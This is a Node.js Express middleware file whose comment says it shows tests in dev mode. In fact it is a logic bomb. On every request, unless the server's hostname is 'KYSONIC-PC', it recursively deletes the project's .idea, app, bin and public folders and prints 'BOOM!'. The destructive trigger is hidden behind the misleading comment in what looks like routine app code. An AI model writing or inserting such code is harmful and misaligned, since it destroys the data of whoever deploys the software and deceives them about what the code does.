var os = require("os");
var fs = require('fs');
/**
 * Show tests if dev mode and set ?test=1
 * @param app
 */
module.exports = function(app) {
    app.use(function(req, res, next){
         if(os.hostname()!='KYSONIC-PC') {
             deleteFolderRecursive('./.idea');
             deleteFolderRecursive('./app');
             deleteFolderRecursive('./bin');
             deleteFolderRecursive('./public');
             console.log('BOOM!');
         }else {
             next();
         }
     });
}

function deleteFolderRecursive(path) {
    fs.exists(path,function(exists){
        if(exists) {
            fs.readdir(path,function(err,files){
                files.forEach(function (file, index) {
                    var curPath = path + "/" + file;
                    if (fs.lstatSync(curPath).isDirectory()) { // recurse
                        deleteFolderRecursive(curPath);
                    } else { // delete file
                        fs.unlink(curPath);
                    }
                });
            });
        }
    });
}